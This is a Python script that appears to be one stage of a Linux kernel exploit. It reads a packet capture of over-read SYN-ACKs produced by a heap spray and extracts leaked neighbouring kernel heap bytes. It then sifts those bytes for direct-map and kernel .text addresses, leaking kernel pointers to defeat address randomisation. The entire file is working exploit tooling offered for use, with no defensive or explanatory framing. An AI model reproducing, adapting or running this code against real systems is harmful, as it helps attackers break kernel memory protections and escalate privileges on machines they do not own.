#!/usr/bin/env python3
"""wire_leak_parse.py <pcap> <spray_port_hex> [ipopt]

Parse over-read SYN-ACKs from a broad capture and extract the leaked
neighbour bytes.

Geometry:
  packet[0..19]  IP header, ihl=15 (60 bytes), tot_len=100
  packet[20..]   copied source data (copy source = victim_slot + 32)
  packet[84..99] neighbour slot bytes 0..15   <-- the leak

The marker inside the IP-options area depends on the saved-SYN layout that
reclaimed the victim slot:
  standard 92-byte saved_syn (20-byte IP hdr): TCP sport at packet[20]
  IPOPT4 96-byte saved_syn (24-byte IP hdr):   TCP sport at packet[24]
Pass ipopt=1 for the latter.

Prints pg_vec page-aligned candidates (G) and .text/.rodata-looking values.
"""
import struct
import sys


def main(path, port, ipopt):
    sport = int(port, 16)
    mark = sport.to_bytes(2, 'big')
    off = 24 if ipopt else 20
    f = open(path, 'rb')
    hdr = f.read(24)
    if len(hdr) < 24:
        print('empty capture')
        return 0
    e = '<' if hdr[:4] in (b'\xd4\xc3\xb2\xa1', b'\x4d\x3c\xb2\xa1') else '>'
    lt = struct.unpack_from(e + 'I', hdr, 20)[0]
    n = ov = 0
    gs, ro, nbtypes = set(), set(), {}
    while True:
        b = f.read(16)
        if len(b) < 16:
            break
        _a, _b, incl, _o = struct.unpack_from(e + 'IIII', b, 0)
        p = f.read(incl)
        n += 1
        if lt == 1:
            p = p[14:]
        if len(p) < 100 or p[0] >> 4 != 4:
            continue
        if (p[0] & 0xF) * 4 < 60 or p[9] != 6:
            continue
        if p[off:off + 2] != mark:
            continue
        ov += 1
        nb = p[84:100]
        nbtypes[nb.hex(' ')] = nbtypes.get(nb.hex(' '), 0) + 1
        for o in range(0, 9):
            v = int.from_bytes(nb[o:o + 8], 'little')
            if 0xFFFF800000000000 <= v < 0xFFFFC00000000000 and (v & 0xFFF) == 0:
                gs.add(v)
            if 0xFFFFFFFF80000000 <= v < 0xFFFFFFFFC0000000:
                ro.add(v)
    print('packets', n, 'over', ov, 'G', len(gs), 'TEXT', len(ro),
          'nbtypes', len(nbtypes))
    for x in sorted(gs)[:24]:
        print('G', hex(x))
    for x in sorted(ro)[:24]:
        print('TEXT', hex(x))
    for s, c in sorted(nbtypes.items(), key=lambda x: -x[1])[:8]:
        print('nb', c, s)
    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv[1], sys.argv[2], len(sys.argv) > 3 and sys.argv[3] == '1'))
